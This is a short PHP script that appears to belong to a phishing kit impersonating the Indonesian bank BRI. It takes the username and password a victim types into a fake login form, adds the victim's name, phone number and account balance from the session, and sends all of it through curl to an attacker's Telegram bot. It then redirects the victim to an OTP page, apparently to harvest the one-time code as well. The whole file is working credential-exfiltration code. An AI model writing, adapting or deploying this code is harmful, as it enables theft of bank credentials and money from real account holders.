<?php
session_start();
include "telegram.php";

$user = $_POST['uname'];
$pass = $_POST['pass'];
$nama = $_SESSION['nama'];
$saldo = $_SESSION['saldo'];
$nomor = $_SESSION['nomor'];
$_SESSION['uname'] = $user;
$_SESSION['pass'] = $pass;

$message = "
( BRI | DATA |  ".$nomor." )
-- DATA AKUN DISINI --

×> Nama Lengkap : ".$nama."
×> Nomor HP : ".$nomor."
×> Saldo Sisa : ".$saldo."
×> Username : ".$user."
×> Password : ".$pass."

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location:./../otp.php');
?>
